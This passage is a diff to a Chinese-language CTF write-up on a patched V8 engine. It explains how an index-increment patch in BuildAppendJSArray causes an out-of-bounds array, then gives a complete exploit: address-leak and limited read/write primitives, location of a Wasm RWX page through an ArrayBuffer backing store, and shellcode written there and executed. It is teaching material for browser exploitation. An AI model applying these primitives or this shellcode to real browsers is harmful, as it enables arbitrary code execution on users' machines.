@@ -774,7 +774,7 @@ index 16fd384..8bf435a 100644
 1. `BuildAppendJSArray` 函数先获取了原数组的 length 和 elements；
 2. 判断原数组 elements（即 FixedArray）的容量，若不足则调整容量；
 3. 将参数用 ForEach 循环依次存入新的 elements 中；
-4. *原先会将 `var_length`，即 index 递增，经过 patch 过后会直接增加 3；*
+4. **原先会将 `var_length`，即 index 递增，经过 patch 过后会直接增加 3；**
 5. 结束循环后设置 `array.length` 并返回。
 
 其中「增加容量」和「递增 index 并最终设置 `array.length`」二者的操作是通过不同的方法计算出来的，而题目中 patch 了后者的计算逻辑，使得最终的 `array.length` 可以超过调整出来 elements 的容量，就直接导致了 OOB。
@@ -800,9 +800,277 @@ console.log(victim.length);
 %SystemBreak();
 ```
 
+运行后可以发现长度为 37 的数组的元素容量却只有 35：
 
+```c
+d8>  console.log(victim.length);
+37
+d8> %DebugPrint(victim);
+DebugPrint: 0x37dc081486d9: [JSArray]
+ - map: 0x37dc08303905 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x37dc082cb351 <JSArray[0]>
+ - elements: 0x37dc08149dd5 <FixedDoubleArray[35]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 37
+ - properties: 0x37dc080426e5 <FixedArray[0]> {
+    0x37dc08044651: [String] in ReadOnlySpace: #length: 0x37dc08242161 <AccessorInfo> (const accessor descriptor)
+ }
+ - elements: 0x37dc08149dd5 <FixedDoubleArray[35]>
+```
 
+若继续向数组里 push 浮点数，则会触发 OOM crash，因此最多只能获得 16 bytes 的 oob，故这里可以结合调试构造更强的 POC：
 
+```javascript
+let victim = [1.1];
+victim.push(1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 10.1, 11.11, 12.12);
+
+let evil = new Array(1).fill(4.3);
+let evil_elem_addr = helper.ftoil(victim[0x24]);
+let double_map = helper.ftoil(victim[0x23]);
+let double_proto = helper.ftoih(victim[0x23]);
+victim[0x24] = helper.i64tof64((0x1000n << 32n) | BigInt(evil_elem_addr));
+console.log(evil.length);
+```
+
+即在原 OOB array 的后面再构造一个 Double Array，注意在声明时采用了 `new Array` 的写法，是因为这样可以保证其 elements 在数组对象的内存之后，于是形成了如下内存布局：
+
+```javascript
+        +---------------------------+
+victim: |   proto    |    map       |
+        |---------------------------|
+        | size (2*sz)|    elem      |------+
+        |---------------------------|      |
+        |          ...              |      |
+        |          ...              |      |
+        |---------------------------|      |
+elem:   |   size     |    elem map  | <----+
+        |---------------------------|
+        |     double data           |
+        |---------------------------|
+        |          ...              |
+        |---------------------------|
+        |     double data           |
+        |---------------------------|
+evil:   |   proto    |    map       | // oob
+        |---------------------------|
+        |   size     |    elem      | // oob
+        +---------------------------+
+```
+
+在这种构造下，就可以在获得 double 类型 Array 的 map 与 prototype 的同时篡改新数组的 size 从而获得更大的 OOB，因此上面那段 poc 运行后会输出 `evil.length = 2048`。
+
+### 受限的任意地址读写
+
+在上面构造了超大范围 oob 的情况下，就可以用很多种方法、很轻松地实现任意地址读写，注意由于 elem 指针实际指在一个 FixedArray 对象上，因此在篡改 elem 指针的时候要注意把地址减 8 才能成功读写目标位置的数据：
+
+```javascript
+let obj_arr = [{}];
+let obj_arr_map = helper.ftoil(evil[0x12]);
+let obj_arr_proto = helper.ftoih(evil[0x12]);
+
+function get_addr(x) {
+  obj_arr[0] = x;
+  evil[0x12] = helper.i64tof64(
+    (BigInt(double_proto) << 32n) | BigInt(double_map),
+  );
+  let res = helper.ftoil(obj_arr[0]) - 1;
+  evil[0x12] = helper.i64tof64(
+    (BigInt(obj_arr_proto) << 32n) | BigInt(obj_arr_map),
+  );
+  return res;
+}
+
+function limited_read(x) {
+  evil[0x12] = helper.i64tof64(
+    (BigInt(double_proto) << 32n) | BigInt(double_map),
+  );
+  evil[0x13] = helper.i64tof64((2n << 32n) | (BigInt(x) - 8n) | 1n);
+  let res = helper.f64toi64(obj_arr[0]);
+  evil[0x12] = helper.i64tof64(
+    (BigInt(obj_arr_proto) << 32n) | BigInt(obj_arr_map),
+  );
+  return res;
+}
+
+function limited_write(x, data) {
+  evil[0x12] = helper.i64tof64(
+    (BigInt(double_proto) << 32n) | BigInt(double_map),
+  );
+  evil[0x13] = helper.i64tof64((2n << 32n) | (BigInt(x) - 8n) | 1n);
+  obj_arr[0] = helper.i64tof64(data);
+  evil[0x12] = helper.i64tof64(
+    (BigInt(obj_arr_proto) << 32n) | BigInt(obj_arr_map),
+  );
+}
+```
+
+之所以说是受限的，是因为开启指针压缩后，只能改到实际地址的后 32 位，前 32 位存在 `$r13` 寄存器内。
+
+接下来就需要考虑怎么完成最终利用，即执行 shellcode：
+
+### 常规方法 - ArrayBuffer + WasmInstance
+
+正如之前所说的，在没开启沙箱的情况下 ArrayBuffer 位于 v8 堆之外的单独内存区域，因此在调用时也保留了完整的 64 位地址，因此也可以继续使用上一道例题的思路完成利用：
+
+```javascript
+class Helpers {
+  constructor() {
+    this.buf = new ArrayBuffer(8);
+    this.f64 = new Float64Array(this.buf);
+    this.f32 = new Float32Array(this.buf);
+    this.u32 = new Uint32Array(this.buf);
+    this.u64 = new BigUint64Array(this.buf);
+    this.state = {};
+  }
+
+  ftoil(f) {
+    this.f64[0] = f;
+    return this.u32[0];
+  }
+
+  ftoih(f) {
+    this.f64[0] = f;
+    return this.u32[1];
+  }
+
+  itof(i) {
+    this.u32[0] = i;
+    return this.f32[0];
+  }
+
+  f64toi64(f) {
+    this.f64[0] = f;
+    return this.u64[0];
+  }
+
+  i64tof64(i) {
+    this.u64[0] = i;
+    return this.f64[0];
+  }
+
+  clean() {
+    this.state.fake_object.fill(0);
+  }
+
+  hex(x) {
+    return x.toString(16).padStart(16, "0");
+  }
+
+  printhex(val) {
+    console.log("0x" + val.toString(16));
+  }
+
+  add_ref(object) {
+    this.state[this.i++] = object;
+  }
+
+  gc() {
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+  }
+}
+
+let helper = new Helpers();
+
+let victim = [1.1];
+victim.push(1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 10.1, 11.11, 12.12);
+console.log(victim.length);
+
+let evil = new Array(1).fill(4.3);
+let evil_elem_addr = helper.ftoil(victim[0x24]);
+let double_map = helper.ftoil(victim[0x23]);
+let double_proto = helper.ftoih(victim[0x23]);
+victim[0x24] = helper.i64tof64((0x1000n << 32n) | BigInt(evil_elem_addr));
+console.log(evil.length);
+
+let obj_arr = [{}];
+let obj_arr_map = helper.ftoil(evil[0x12]);
+let obj_arr_proto = helper.ftoih(evil[0x12]);
+// %DebugPrint(obj_arr);
+
+function get_addr(x) {
+  obj_arr[0] = x;
+  evil[0x12] = helper.i64tof64(
+    (BigInt(double_proto) << 32n) | BigInt(double_map),
+  );
+  let res = helper.ftoil(obj_arr[0]) - 1;
+  evil[0x12] = helper.i64tof64(
+    (BigInt(obj_arr_proto) << 32n) | BigInt(obj_arr_map),
+  );
+  return res;
+}
+
+function limited_read(x) {
+  evil[0x12] = helper.i64tof64(
+    (BigInt(double_proto) << 32n) | BigInt(double_map),
+  );
+  evil[0x13] = helper.i64tof64((2n << 32n) | (BigInt(x) - 8n) | 1n);
+  let res = helper.f64toi64(obj_arr[0]);
+  evil[0x12] = helper.i64tof64(
+    (BigInt(obj_arr_proto) << 32n) | BigInt(obj_arr_map),
+  );
+  return res;
+}
+
+function limited_write(x, data) {
+  evil[0x12] = helper.i64tof64(
+    (BigInt(double_proto) << 32n) | BigInt(double_map),
+  );
+  evil[0x13] = helper.i64tof64((2n << 32n) | (BigInt(x) - 8n) | 1n);
+  obj_arr[0] = helper.i64tof64(data);
+  evil[0x12] = helper.i64tof64(
+    (BigInt(obj_arr_proto) << 32n) | BigInt(obj_arr_map),
+  );
+}
+
+let ab = new ArrayBuffer(0x1337);
+let ab_helper = new DataView(ab);
+let buf_backing_store_addr = get_addr(ab) + 0x14;
+helper.printhex(buf_backing_store_addr);
+// %DebugPrint(ab);
+
+let exp = () => {
+  let wasm_code = new Uint8Array([
+    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
+    130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
+    128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
+    128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0,
+    0, 10, 142, 128, 128, 128, 0, 1, 136, 128, 128, 128, 0, 0, 65, 239, 253,
+    182, 245, 125, 11,
+  ]);
+  let wasm_module = new WebAssembly.Module(wasm_code);
+  let wasm_instance = new WebAssembly.Instance(wasm_module);
+  let func = wasm_instance.exports.main;
+  let wasm_instance_addr = get_addr(wasm_instance);
+  let func_addr = get_addr(func);
+  // %DebugPrint(wasm_instance);
+  // %DebugPrint(func);
+  // %SystemBreak();
+
+  let rwx_addr = limited_read(wasm_instance_addr + 0x68);
+  helper.printhex(rwx_addr);
+  // %SystemBreak();
+
+  let shellcode = [
+    0x10101010101b848n,
+    0x68632eb848500101n,
+    0x431480169722e6fn,
+    0xf631d231e7894824n,
+    0x50f583b6an,
+  ];
+
+  limited_write(buf_backing_store_addr, rwx_addr);
+  for (let i = 0; i < shellcode.length; i++) {
+    ab_helper.setBigInt64(i * 8, shellcode[i], true);
+  }
+
+  func();
+};
+
+exp();
+```
 
 ---
 
